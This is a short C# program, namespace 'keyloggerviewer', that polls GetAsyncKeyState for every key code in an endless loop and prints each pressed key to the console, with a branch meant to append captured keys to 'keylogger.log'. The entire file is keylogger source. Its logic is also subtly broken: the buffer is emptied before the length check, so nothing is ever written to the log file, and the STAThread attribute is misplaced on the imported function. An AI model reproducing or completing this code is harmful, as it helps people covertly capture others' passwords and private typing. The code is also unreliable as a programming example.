using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace keyloggerviewer
{
    static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main()
        {
            /*Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            DbLink connection = new DbLink();
            Application.Run(new Form1(connection));*/
            string buf = "";
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        buf += ((Keys)i).ToString();
                        Console.WriteLine(buf);
                        buf = "";
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("keylogger.log", buf);
                            
                            
                        }
                    }
                }
            }

        }
    }
}